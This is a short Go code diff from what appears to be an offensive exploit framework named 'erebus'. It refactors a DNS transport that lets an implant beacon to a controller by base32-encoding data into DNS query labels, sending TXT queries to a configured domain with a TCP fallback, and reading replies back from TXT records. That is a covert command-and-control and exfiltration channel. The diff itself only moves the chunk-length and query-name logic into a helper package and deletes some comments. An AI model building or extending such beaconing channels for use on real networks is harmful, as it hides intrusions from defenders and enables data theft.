@@ -7,6 +7,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/KKingZero/erebus-exploit-framwork/pkg/dnstransport"
 	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
 	"github.com/miekg/dns"
 	"google.golang.org/protobuf/proto"
@@ -79,13 +80,7 @@ func (t *DNSTransport) Beacon(beacon *pb.Beacon) (*pb.BeaconResponse, error) {
 func (t *DNSTransport) sendDNS(data []byte, sessionLabel string) ([]byte, error) {
 	encoded := strings.ToLower(b32Enc.EncodeToString(data))
 
-	// Calculate max data per label accounting for session label and domain overhead
-	// FQDN max = 253 chars. Format: <chunk>.<sessionLabel>.<domain>
-	overhead := len(sessionLabel) + len(t.domain) + 2 // dots
-	maxChunkLen := 253 - overhead
-	if maxChunkLen > 63 {
-		maxChunkLen = 63 // DNS label max
-	}
+	maxChunkLen := dnstransport.MaxDataLabelLen(sessionLabel, t.domain)
 	if maxChunkLen <= 0 {
 		return nil, fmt.Errorf("DNS domain too long: no room for data")
 	}
@@ -100,14 +95,15 @@ func (t *DNSTransport) sendDNS(data []byte, sessionLabel string) ([]byte, error)
 		encoded = encoded[end:]
 	}
 
+	total := len(chunks)
 	var allResponseData []byte
 
 	for i, chunk := range chunks {
-		qname := fmt.Sprintf("%s.%s.%s", chunk, sessionLabel, t.domain)
+		qname := dnstransport.BuildQueryName(i, total, chunk, sessionLabel, t.domain)
 
 		respData, err := t.queryTXT(qname)
 		if err != nil {
-			return nil, fmt.Errorf("DNS query chunk %d/%d: %w", i+1, len(chunks), err)
+			return nil, fmt.Errorf("DNS query chunk %d/%d: %w", i+1, total, err)
 		}
 
 		if len(respData) > 0 {
@@ -130,7 +126,6 @@ func (t *DNSTransport) queryTXT(qname string) ([]byte, error) {
 
 	resp, _, err := client.Exchange(msg, t.dnsServer)
 	if err != nil {
-		// Fallback to TCP
 		client.Net = "tcp"
 		conn, err2 := net.DialTimeout("tcp", t.dnsServer, 10*time.Second)
 		if err2 != nil {
@@ -149,7 +144,6 @@ func (t *DNSTransport) queryTXT(qname string) ([]byte, error) {
 		return nil, nil
 	}
 
-	// Extract TXT record data
 	var encoded strings.Builder
 	for _, rr := range resp.Answer {
 		if txt, ok := rr.(*dns.TXT); ok {
